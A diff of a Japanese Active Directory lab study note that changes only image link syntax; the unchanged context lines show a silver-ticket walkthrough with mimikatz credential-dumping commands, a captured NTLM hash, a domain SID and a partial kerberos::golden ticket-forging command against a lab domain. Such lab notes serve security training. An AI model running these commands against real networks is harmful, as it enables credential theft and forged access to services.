@@ -30,7 +30,7 @@ iwr : Server Error
 privilege::debug
 sekurlsa::logonpasswords
 ```
-![](../../../assets/images/Pasted%20image%2020260502090042.png)
+![[Pasted image 20260502090042.png]]
 ```
 4d28cf5252d39971419580a51484ca09
 ```
@@ -39,7 +39,7 @@ sekurlsa::logonpasswords
 ```powershell
 whoami /user
 ```
-![](../../../assets/images/Pasted%20image%2020260502090051.png)
+![[Pasted image 20260502090051.png]]
 ```
 S-1-5-21-1987370270-658905905-1781884369-1105
 ```
@@ -63,20 +63,20 @@ kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com 
 - /rc4: SPNのNTLMハッシュ
 - /ptt コマンドを実行するマシンのメモリに偽造チケットを挿入するためのオプション
 - /user: 既存のドメインユーザーを入力。このユーザーは偽造チケットに設定されます。この例では jeffadminを使用しますが、権限とグループは自分で設定できるため、他のドメインユーザーでも構いません。
-![](11_Active_Directory/02_AD認証への攻撃/assets/images/Pasted%20image%2020250818225319.png)
+![[Pasted image 20250818225319.png]]
 Group IDを確認すると強力なグループのメンバーに偽装されていることがわかる
 
 # メモリ上のチケットを確認
 ```powershell
 klist
 ```
-![](../../../assets/images/Pasted%20image%2020260502090846.png)
+![[Pasted image 20260502090846.png]]
 
 # 現在のユーザがWebサイトにアクセスできるかの再確認
 ```powershell
 iwr -UseDefaultCredentials http://web04
 ```
-![](../../../assets/images/Pasted%20image%2020260502090854.png)
+![[Pasted image 20260502090854.png]]
 
 ## Lab
 ```powershell
